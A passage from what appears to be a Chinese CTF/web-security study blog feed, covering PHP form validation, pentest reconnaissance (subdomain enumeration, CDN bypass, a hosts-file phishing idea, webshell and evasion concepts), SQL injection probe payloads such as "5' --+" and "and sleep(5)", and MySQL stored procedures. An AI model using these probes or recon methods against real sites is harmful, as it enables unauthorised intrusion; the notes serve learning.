class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="函数和过滤器"><a href="#函数和过滤器" class="headerlink" title="函数和过滤器"></a>函数和过滤器</h2><ol><li>如果需要过滤变量，使用以下的过滤器函数之一<pre class="line-numbers language-none"><code class="language-none">filter_var() 通过一个指定的过滤器来过滤单一的变量filter_var_array() 通过相同的或不同的过滤器来过滤多个变量filter_input() 获取一个输入变量，并对它进行过滤filter_input_array() 获取多个输入变量，并通过相同的或不同的过滤器对他们进行过滤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><a href="https://www.w3school.com.cn/php/php_ref_filter.asp">https://www.w3school.com.cn/php/php_ref_filter.asp</a>  php-filter函数</li></ol><h1 id="PHP表单"><a href="#PHP表单" class="headerlink" title="PHP表单"></a>PHP表单</h1><h2 id="PHP表单处理"><a href="#PHP表单处理" class="headerlink" title="PHP表单处理"></a>PHP表单处理</h2><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;&lt;body&gt;&lt;form action&#x3D;&#39;welcome.php&#39; method&#x3D;&#39;post&#39;&gt;Name: &lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;name&#39;&gt;&lt;br&gt;E-mail: &lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;email&#39;&gt;&lt;br&gt;&lt;input type&#x3D;&#39;submit&#39;&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>用户填写此表单并点击提交按钮后，表单数据会发送到名为welcome.php的文件供处理，表单数据是通过HTTP POST的方式发送的</li><li>如需显示出被提交的数据，您可以简单地输出（echo）所有变量。”welcome.php” 文件是这样的：<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;&lt;body&gt;welcome &lt;?php echo $_POST[&quot;name&quot;];?&gt;&lt;br&gt;your email address is: &lt;?php echo $_POST[&quot;email&quot;]?&gt;&lt;br&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h2><h3 id="文本字段"><a href="#文本字段" class="headerlink" title="文本字段"></a>文本字段</h3><pre class="line-numbers language-none"><code class="language-none">Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&#39;name&#39;&gt;E-mail: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&#39;email&#39;&gt;website: &lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;website&#39;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h3><ol><li>gender字段是单选按钮,其中，radio的type类型是单选框<pre class="line-numbers language-none"><code class="language-none">gender:&lt;input type&#x3D;&#39;radio&#39; name&#x3D;&#39;gender&#39; value&#x3D;&#39;female&#39;&gt; female&lt;input type&#x3D;&#39;radio&#39; name&#x3D;&#39;gender&#39; value&#x3D;&#39;male&#39;&gt; male<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="表单元素"><a href="#表单元素" class="headerlink" title="表单元素"></a>表单元素</h3><pre class="line-numbers language-none"><code class="language-none">&lt;form method&#x3D;&#39;post&#39; action&#x3D;&quot;&lt;?php echo htmlspecialchars($_SERVER[&quot;PHP_SELF&quot;]);?&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>当提交此表单时，通过method=’post’发送表单数据</li></ol><h3 id="SERVER-“PHP-SELF”"><a href="#SERVER-“PHP-SELF”" class="headerlink" title="$_SERVER[“PHP_SELF”]"></a>$_SERVER[“PHP_SELF”]</h3><ol><li>$_SERVER[“PHP_SELF”]是一种超全局变量，它返回当前执行脚本的文件名</li><li>因此，$_SERVER[“PHP_SELF”]将表单数据发送到页面本身，而不是跳转到另一张页面，这样用户就能在表单页面获得错误提示信息</li></ol><h2 id="表单验证-1"><a href="#表单验证-1" class="headerlink" title="表单验证"></a>表单验证</h2><h3 id="验证名字"><a href="#验证名字" class="headerlink" title="验证名字"></a>验证名字</h3><ol><li>检查name字段是否包含字母和空格，如果name字段无效，则存储一条错误信息<pre class="line-numbers language-none"><code class="language-none">$name&#x3D;test_input($_POST[&quot;name&quot;]);if(!preg_match(&quot;&#x2F;^[a-zA-Z]*$&#x2F;&quot;,name))&#123;    $emailErr&#x3D;&#39;无效的email格式&#39;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li>preg_match()函数检索字符串的模式，如果模式存在则返回true,否则返回false</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪老师信息收集</title>
      <link href="/%E5%B0%8F%E8%BF%AA%E8%80%81%E5%B8%88/"/>
      <url>/%E5%B0%8F%E8%BF%AA%E8%80%81%E5%B8%88/</url>
      
        <content type="html"><![CDATA[<h1 id="概念名词"><a href="#概念名词" class="headerlink" title="概念名词"></a>概念名词</h1><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><ol><li>网站地址的名称</li><li>注册：在第三方平台注册，万网（被阿里云收购）<h3 id="二级域名，多级域名"><a href="#二级域名，多级域名" class="headerlink" title="二级域名，多级域名"></a>二级域名，多级域名</h3></li><li>www是顶级域名，域名有几个点就算几个域名，一级域名只有一个点，往往由与品牌高度相关的主域名和后缀组成</li><li>二级域名，是一级域名的子域名，是企业根据不同的业务场景进行的拓展</li><li>一级域名和二级域名区别：二级域名依附于一级域名而存在吗，没有一级域名，就不存在二级域名，如果不作二级域名，一级域名则不会受到影响。</li><li>处罚连带不同，一级域名被处罚，二级域名也会被处罚；二级域名被处罚时，一级域名则不会受到影响。</li><li>以example.cn这个一级域名为例，我们在设置解析记录时，将主机记录值设置为“www”，然后指向IP为192.168.1.1，那么我们访问<a href="http://www.example.cn,就会跳转到192.168.1.1这个站点;如果我们将主机值设置为“mail”,然后将ip指向192.168.2.2,那么我们访问mail.example.cn就会跳转到192.168.2.2这个站点./">www.example.cn，就会跳转到192.168.1.1这个站点；如果我们将主机值设置为“mail”，然后将IP指向192.168.2.2，那么我们访问mail.example.cn就会跳转到192.168.2.2这个站点。</a><h4 id="域名分类"><a href="#域名分类" class="headerlink" title="域名分类"></a>域名分类</h4></li><li>国家级和地区级顶级域名</li><li>一级域名</li><li>二级域名</li></ol><h2 id="域名发现对渗透测试的意义"><a href="#域名发现对渗透测试的意义" class="headerlink" title="域名发现对渗透测试的意义"></a>域名发现对渗透测试的意义</h2><ol><li>不同的多级域名包含的信息不同，例如<a href="http://www.xxx.com/">www.xxx.com</a> 和jw.xxx.com的网页信息可能不同，可以多个尝试</li><li>多级域名是给与了多个可能性</li></ol><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><ol><li>域名系统服务协议</li><li>用于域名和IP地址的相互转换</li><li>网页搭建的时候是将IP解析到指定域名下</li></ol><h3 id="本地hosts和dns的关系"><a href="#本地hosts和dns的关系" class="headerlink" title="本地hosts和dns的关系"></a>本地hosts和dns的关系</h3><ol><li>ping的时候，先从本地hosts文件下找对应的域名对应的IP，并ping这个IP</li><li>如果没有，则到互联网的DNS服务器中找</li><li>目的：如果当绑定IP地址绑定到指定域名下时</li><li>在对方访问的时候，令对方访问到你指定的IP地址中去</li><li>如果能修改对方的hosts文件，修改一个对方需要访问的域名对应的IP，对方仍使用这个域名的时候就可以访问到自己写的网站，从而构成钓鱼链接</li></ol><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><ol><li>网络协议</li><li>内容分布网络，节点技术</li><li>在访问的时候，会自动匹配到速度较好的服务器，而这个服务器被叫做节点</li><li>在访问网站的真实数据的时候，访问的节点上的缓存，而不是网站的真实数据</li><li>扫描网站的时候，访问的是缓存，而不是真正的网站数据，是没有任何意义的</li></ol><h3 id="刷新dns缓存命令-windows"><a href="#刷新dns缓存命令-windows" class="headerlink" title="刷新dns缓存命令(windows)"></a>刷新dns缓存命令(windows)</h3><ol><li>ipconfig /flushdns</li></ol><h3 id="DNS攻击"><a href="#DNS攻击" class="headerlink" title="DNS攻击"></a>DNS攻击</h3><ol><li>dns劫持等</li><li>导致大量用户访问网站的时候被<strong>恶意解析</strong>，<strong>访问到其它的IP</strong></li><li>每个地区解析的地址不一样，对应的DNS服务器地址不一样，被黑对应的一部分服务器，对应的就是一部分地区的用户，所以LINUX老师在上课的时候说现在网络安全性很好，没有<strong>大范围的网络瘫痪</strong></li></ol><h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2><ol><li>网站源码有多种脚本语言编写，常见<strong>php</strong> <strong>javaweb</strong>,asp aspx jsp pi <strong>py</strong> cgi<h3 id="不同脚本类型和安全漏洞的关系"><a href="#不同脚本类型和安全漏洞的关系" class="headerlink" title="不同脚本类型和安全漏洞的关系"></a>不同脚本类型和安全漏洞的关系</h3></li><li>如果语言严谨，注重发展比较多，发展时间长，安全性漏洞性高</li><li>所以开发用安全语言</li><li>php用于小众网站，java用于大众网站</li></ol><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><ol><li>攻击者通常会留一个后门文件，便于下一次获得权限，webshell</li><li>远控木马等的通称，是一个泛称</li></ol><h3 id="后门在安全测试中的意义"><a href="#后门在安全测试中的意义" class="headerlink" title="后门在安全测试中的意义"></a>后门在安全测试中的意义</h3><ol><li>便于下一次方便地获取权限进系统</li><li>获取到相关权限，类似一个管道，操作这台服务区需要一个东西链接上去，这个东西就叫做后门</li></ol><h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><ol><li>核心</li><li>网站大多数集合了一些防护杀毒，免杀就是隐藏，不被杀毒检测到，隐藏起来</li></ol><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="组成架构模型"><a href="#组成架构模型" class="headerlink" title="组成架构模型"></a>组成架构模型</h3><ol><li>网站源码：脚本类型(java反序列化，php上传漏洞)、分应用方向（方向不同，函数不同，漏洞也就不同）</li><li>服务器操作系统：windows,linux（系统不同，命令不同，登录服务器的方式不同）</li><li>中间件（搭建平台）:apache lis tomcat nginx （提供服务的，网站除了网站源码，还需要运行网站源码）</li><li>数据库:access mysql oracle db2 postsql（储存数据）</li></ol><h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><h3 id="web源码对应漏洞"><a href="#web源码对应漏洞" class="headerlink" title="web源码对应漏洞"></a>web源码对应漏洞</h3><ol><li>sql注入</li><li>文件上传</li><li>xss</li><li>代码执行</li><li>变量覆盖</li><li>逻辑漏洞</li><li>反序列化</li></ol><h3 id="web中间件漏洞"><a href="#web中间件漏洞" class="headerlink" title="web中间件漏洞"></a>web中间件漏洞</h3><h3 id="web数据库对应漏洞"><a href="#web数据库对应漏洞" class="headerlink" title="web数据库对应漏洞"></a>web数据库对应漏洞</h3><h3 id="web系统层漏洞"><a href="#web系统层漏洞" class="headerlink" title="web系统层漏洞"></a>web系统层漏洞</h3><h3 id="第三方对应漏洞"><a href="#第三方对应漏洞" class="headerlink" title="第三方对应漏洞"></a>第三方对应漏洞</h3><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><h3 id="多级域名枚举查找"><a href="#多级域名枚举查找" class="headerlink" title="多级域名枚举查找"></a>多级域名枚举查找</h3><ol><li>使用浏览器查找（爬）：输入一级域名，自动查找匹配二级域名，例如：搜索baidu.com,会自动匹配<a href="http://www.baidu.com和vip.baidu.com等/">www.baidu.com和vip.baidu.com等</a></li><li>子域名爆破（<strong>layer子域名挖掘机</strong>）的字典是前缀，所以爆破的时候需要删除二级域名，只保留已经确定的一级域名</li><li>注意：御剑跑的是后缀，而不是前缀</li></ol><h1 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h1><h2 id="主要用于信息搜集"><a href="#主要用于信息搜集" class="headerlink" title="主要用于信息搜集"></a>主要用于信息搜集</h2><h2 id="初衷"><a href="#初衷" class="headerlink" title="初衷"></a>初衷</h2><ol><li>提升网络速度</li><li>cdn服务</li><li>但是cdn需要花钱，所以按需来，不是每一个网站都有cdn服务，开得越多，成本越大</li></ol><h2 id="cdn原理"><a href="#cdn原理" class="headerlink" title="cdn原理"></a>cdn原理</h2><ol><li>从网上下载东文件，为了下一个访问者下载更快，上一个访问者下载之后，会在本地运营商的服务器中留缓存，下一个访问者下载时，会优先在这个服务器中的缓存中下载</li><li>分配缓存实际是分配节点，会就近分配一个节点给用户</li><li>和互联网的缓存原理相同，访问时会优先本地请求</li><li><strong>但是缓存不是实时更新的</strong></li><li>渗透测试时可能操作的是cdn缓存，而不是真正的目标</li></ol><h2 id="如何判定目标存在CDN服务"><a href="#如何判定目标存在CDN服务" class="headerlink" title="如何判定目标存在CDN服务"></a>如何判定目标存在CDN服务</h2><ol><li>利用网站超级ping（<strong>多个地点ping服务</strong>）（利用<strong>海外和国内多个服务器</strong>对目标网站进行<strong>ping</strong>的操作，根据IP地址的<strong>回显</strong>来判断是否有cdn）</li><li><strong><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></strong></li><li>如果一个网站出现两个IP，就开启了ｃｄｎ服务</li></ol><h2 id="常见CDN绕过技术"><a href="#常见CDN绕过技术" class="headerlink" title="常见CDN绕过技术"></a>常见CDN绕过技术</h2><h3 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h3><ol><li>有可能子域名和主域名不在一个服务器上</li><li>一种可能是和主站放在一起（同一个IP地址）</li><li>还有一个可能是放在同一网段下，不同主机下（网络号相同，但是主机号不同）</li><li>或在不同网段<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3></li><li>为了节约成本，站长可能会对访问量较大的网站做cdn服务</li><li>对那些小的子网站不做cdn服务</li></ol><h3 id="邮件服务查询"><a href="#邮件服务查询" class="headerlink" title="邮件服务查询"></a>邮件服务查询</h3><ol><li>邮件服务器</li><li>对方把邮件发给你，如果有cdn服务时，自己访问邮箱地址的时候是就近安排节点</li><li>但是对方给你发邮件的时候，不会走cdn，随便找个cdn服务器发送</li></ol><h3 id="国外地址请求"><a href="#国外地址请求" class="headerlink" title="国外地址请求"></a>国外地址请求</h3><h3 id="遗留文件，扫描全网"><a href="#遗留文件，扫描全网" class="headerlink" title="遗留文件，扫描全网"></a>遗留文件，扫描全网</h3><ol><li>遗留文件就是phpinfo</li></ol><h3 id="黑暗引擎搜索特定文件"><a href="#黑暗引擎搜索特定文件" class="headerlink" title="黑暗引擎搜索特定文件"></a>黑暗引擎搜索特定文件</h3><ol><li>shodan   撒旦</li><li>fofa   </li><li>zoomeye   钟馗之眼<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4></li><li>另类的搜索引擎，利用这个黑暗引擎可以搜索到不常见的东西</li><li>这些搜索引擎会定期把网上一些深层次的东西爬到数据库中</li><li>这些数据库中的东西就是实时的（延时低）</li></ol><h3 id="dns历史记录，以量打量"><a href="#dns历史记录，以量打量" class="headerlink" title="dns历史记录，以量打量"></a>dns历史记录，以量打量</h3>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>判断注入类型</title>
      <link href="/%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/"/>
      <url>/%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h1><h2 id="区分是字符型注入还是数字型注入"><a href="#区分是字符型注入还是数字型注入" class="headerlink" title="区分是字符型注入还是数字型注入"></a>区分是字符型注入还是数字型注入</h2><h3 id="数字型注入："><a href="#数字型注入：" class="headerlink" title="数字型注入："></a>数字型注入：</h3><ol><li>假设后台语句构造为select * from table where id=$id</li><li>传入5’ –+</li><li>select * from table where id=5’ –+ 未产生单引号闭合，所以报错</li></ol><h3 id="字符型注入："><a href="#字符型注入：" class="headerlink" title="字符型注入："></a>字符型注入：</h3><ol><li>假设后台语句构造为select * from table where id=$’id’</li><li>传入5’ –+</li><li>select * from table where id=’5’ –+ ‘</li><li>最后的一个单引号被注释掉，单引号可以闭合，此时查询正确</li></ol><h3 id="所以加单引号去判断是数字型注入还是字符型注入"><a href="#所以加单引号去判断是数字型注入还是字符型注入" class="headerlink" title="所以加单引号去判断是数字型注入还是字符型注入"></a>所以加单引号去判断是数字型注入还是字符型注入</h3><h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;5 and 1&#x3D;1 如果返回页面与原页面一致（回显正确） 则为数值型注入原因：    1. 猜测为数值型，后台语句为select * from table where id&#x3D;5 and 1&#x3D;1；where语句判断条件为真并且id参数值为5，正常执行    2. 猜测为字符型，后台语句为select * from table where id&#x3D;&#39;5 and 1&#x3D;1&#39;;where 语句将找不到id为&#39;5 and 1&#x3D;1&#39; 的参数，语句执行失败如果是字符型：传入 5&#39; and 1&#x3D;1 --+字符型后台语句为：    select * from table where id&#x3D;&#39;5&#39; and 1&#x3D;1 --+ &#39;;后面的单引号被注释，不需要担心单引号闭合问题，id&#x3D;&#39;5&#39;才是真正的id查询语句，id参数的值应该是一个值，而不是带上and 1&#x3D;1,因为数据库中没有带着and 1&#x3D;1的名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="判断页面是否有布尔类型的状态"><a href="#判断页面是否有布尔类型的状态" class="headerlink" title="判断页面是否有布尔类型的状态"></a>判断页面是否有布尔类型的状态</h2><ol><li>判断数据类型是字符型还是数值型（<strong>这个地方的数据类型和注入类型不是一个概念</strong>，<strong>数据类型是只有字符型和数值型，而注入类型是指字符型，数值型，布尔盲注，时间盲注等类型</strong>）</li><li>假设?id=5 and 1=1;返回页面与源页面一致，通过该参数我们可以确定该注入的<strong>数据类型</strong>为数字注入</li><li>当参数为?id=5 and 1=2由于and 1=2 为假，也就是查询条件where id=5 and 1=2恒假，这样的sql语句在数据库中执行后，没有返回结果，也就是说能正常回显内容与语句的真假性有关（<strong>是否出现回显内容与语句的真假性有关</strong>，<strong>而不是回显内容与语句的真假性有关</strong>，语句的真假性若和会先内容有关而不是是否出现回显和语句的真假性有关的话，则不为盲注）<h3 id="判断参数是否存在延迟注入"><a href="#判断参数是否存在延迟注入" class="headerlink" title="判断参数是否存在延迟注入"></a>判断参数是否存在延迟注入</h3></li><li>按f12打开调试面板，修改参数为?id=5 and sleep(5),并刷新，如果sleep语句对网页的响应起到作用，就意味着存在延迟注入的可能</li></ol><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><pre class="line-numbers language-none"><code class="language-none">（1）因为id参数是用户可控的，会随请求带入到数据库中执行并回显相应内容，可能是一个注入点。（2）第一步当id变化时，页面回显响应变化，首先考虑联合注入（3）第二步，加单引号或双引号，当有报错时，可考虑报错注入；（4）当第二步没变化，进行第三步，当页面有布尔类型的状态，可考虑布尔盲注；（5）若都不行，进行第四步，考虑延时注入。（6）从联合注入到盲注以及延迟注入，其时间人力成本逐步增大，尽可能选择低成本方式进行注入。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql存储过程和函数</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%92%8C%E5%87%BD%E6%95%B0/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%92%8C%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="存储过程和数据库"><a href="#存储过程和数据库" class="headerlink" title="存储过程和数据库"></a>存储过程和数据库</h1><pre class="line-numbers language-none"><code class="language-none">show global variables like &#39;_O%&#39;;show session variables;set @username &#x3D; &#39;刘禅&#39;;-- set可以定义全局变量和用户变量，也可以给全局变量，用户变量和局部变量赋值-- declare定义局部变量-- declare 变量名列表 类型 default值-- if条件表达式&#x2F;* if(条件) then 语句序列1;elseif(条件) then 语句序列2;else 语句序列;end if;每个语句序列后面都要加分号;if elseif else endifendif 后面也要加分号*&#x2F;delimiter $$begindeclare v_avgscore float;    select round(avg(score),2) into v_avgscore from sc where sno &#x3D; &#39;s3&#39;;    if(v_avgscore &gt;&#x3D; 80.0) then select &#39;该生成绩好&#39;;elseif(v_avgscore &lt; 80 and v_avgscore &gt;&#x3D; 60) thenselect &#39;一般&#39;;elseselect &#39;abab&#39;;end if;end $$begindeclare v_avgscore float;    select round(avg(score),2) into v_avgscore from sc where sno&#x3D;&#39;s3&#39;;    if() then 语句1;    elseif() then 语句2;    elseif() then 语句3;    else 语句4;    end if;end $$ &#x2F;*case 选择变量名    when 表达式1 then 语句序列1;    when 表达式2 then 语句序列2;    else 语句序列n+1;end case;*&#x2F;begindeclare v_avgscore float;    declare v_grade int;    select round(avg(score),2) into v_avgscore from sc where sno&#x3D;&#39;s1&#39;;    set v_grade &#x3D; truncate(v_avgscore&#x2F;10.0);    case v_gradewhen 10 then 语句序列1;        when 9 then 语句序列2;        when 8 then 语句序列3;        else 语句序列最后一个;        end case;end;-- case和if判断都有else和end case或者end ifbegindeclare v_count,v_sum int default 0;while v_count &lt; 100 doset v_count &#x3D; v_count + 1;        set v_sum &#x3D; v_sum + v_count;end while;    select v_sum as 1~100的和end $$&#x2F;*while 条件表达式 do循环体语句end while;*&#x2F;&#x2F;*repeat循环体语句;until 条件表达式 until后面没有分号结尾end repeat;*&#x2F;begindeclare v_count,v_sum int default 0;    repeatset v_count &#x3D; v_count + 1;        set v_sum &#x3D; v_sum + v_count;        until v_count &gt;&#x3D; 100 -- until后面没有分号end repeat;    select v_sum,v_count;end $$-- while do end while; repeat until end repeat;-- mysql中使用declare handler语句处理异常-- declare handle_action handler for condition_value statementdeclare continue handler for 1062 set info&#x3D;&#39;插入失败，不能插入重复的数据&#39;;declare exit handler for not found set info&#x3D;&#39;查找失败&#39;;declare continue handler for 1064 set info &#x3D; &#39;语法错误&#39;;-- 存储过程，函数，游标，触发器-- 存储过程&#x2F;*create procedure 存储过程名(in&#x2F;out&#x2F;inout 参数名 参数类型    in&#x2F;out&#x2F;inout 参数名2 参数类型2    in&#x2F;out&#x2F;inout 参数名3 参数类型3)begin声明部分;    执行部分;end;*&#x2F;delimiter $$create procedure user_time()beginselect current_user as 当前用户 ,current_date as 当前日期;end $$delimiter ;use school;create procedure p_sum()begindeclare v_count int default 1;    declare v_sum int default 0;while v_count &lt; 100 doset v_sum &#x3D; v_sum + v_count;        set v_count &#x3D; v_count + 2;end while;    select v_sum as &#39;1~100的和&#39;;end $$delimiter ;call p_sum();delimiter $$create procedure p_sum();begindeclare real_sum int default 0;    declare real_count int default 1;    while real_count &lt;&#x3D; 100 doreal_sum &#x3D; real_sum + real_count;        real_count &#x3D; real_count + 1;end while;    select real_sum,real_count;end $$delimiter $$delimiter $$create procedure p_summ()begindeclare real_sum int default 0;    declare real_count int default 1;    repeatreal_sum &#x3D; real_sum + real_count;        real_count &#x3D; real_count + 1;until real_count &gt; 100    end repeat;end $$delimiter ;call user_time();-- 调用存储过程 call 存储过程名([实参1,实参2,实参3,。。。])-- 如果存储过程有参数，可以将参数放在小括号里，如果没有参数，后面的小括号也不能省略。-- 参数：参数名 类型-- 带参数的存储过程delimiter $$create procedure insert_department(p_dno char(2),    p_dname varchar(30);    p_office varchar(4)    )begindeclare info varchar(20) default &#39;插入成功&#39;;    declare continue handler for 1062 set info &#x3D; &#39;插入失败，不能插入重复的数据&#39;;    insert into department values(p_dno,p_dname,p_office);    select info;end $$delimiter ;call insert_department(&#39;D5&#39;,&#39;美术&#39;,&#39;&#39;,&#39;&#39;);-- 带输入参数的存储过程delimiter $$create procedure delete_department(p_dno char(2))begindelete from department where dno&#x3D;p_dno;    select * from department;end $$delimiter ;call delete_department(&#39;D5&#39;);-- 带输出参数的存储过程-- mysql存储过程参数如果不指定in,out,inout,则默认为indelimiter $$create procedure search_department(p_dno char(2),    out p_dname varchar(30) -- 最后一个参数后面不加逗号，类似于select最后一个参数后面不加逗号)begindeclare info varchar(30) default &#39;查找成功&#39;;    declare continue handler for not found set info &#x3D; &#39;查找失败&#39;;    select dname into p_dname from department where dno &#x3D; p_dno;    select info;end $$delimiter ;-- 带输入输出参数的存储过程delimiter $$create procedure swap(inout p_num1 int,    inout p_num2 int -- p_num1和p_num2既作为输入也作为输出，所以是inout)begindeclare v_temp int;    set v_temp &#x3D; p_num1;    set p_num1 &#x3D; p_num2;    set p_num2 &#x3D; v_temp;end $$delimiter ;set @n1&#x3D;12;set @n2&#x3D;56;call swap(@n1,@n2);select @n1,@n2;-- 删除存储过程drop procedure if exists swap;drop procedure if exists swap;drop procedure if exists p_name;-- 函数只可以使用输入类型的数据，但参数前不可以指定IN;-- 参数必须通过return语句来返回一个值，但参数方程没有返回值-- 函数通常作为表达式的一部分杯调用，而存储过程的调用使用的是call-- 创建函数的语法&#x2F;*create function 函数名（参数名1 参数类型1.        参数名2 参数类型2，        参数名n 参数类型n    ）    returns 数据类型    begin声明部分        return 表达式end $$*&#x2F;delimiter $$create function get_avgscore(f_sno char(2))returns floatbeginreturn(select round(avg(score),2))    from sc where sno&#x3D;f_sno;end $$delimiter ;delimiter $$create function get_avgscore(f_sno char(2))returns floatbeginreturn(select round(avg(score),2) from sc where sno &#x3D; f_sno);end $$delimiter ;drop function if exists get_avgscore;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux中用dig命令查询DNS记录</title>
      <link href="/dig%E5%91%BD%E4%BB%A4%E6%9F%A5%E7%9C%8BDNS%E8%AE%B0%E5%BD%95/"/>
      <url>/dig%E5%91%BD%E4%BB%A4%E6%9F%A5%E7%9C%8BDNS%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="dig命令"><a href="#dig命令" class="headerlink" title="dig命令"></a>dig命令</h1><p><a href="https://www.sysgeek.cn/linux-dig/">dig命令</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP Headers</title>
      <link href="/HTTP%20headers/"/>
      <url>/HTTP%20headers/</url>
      
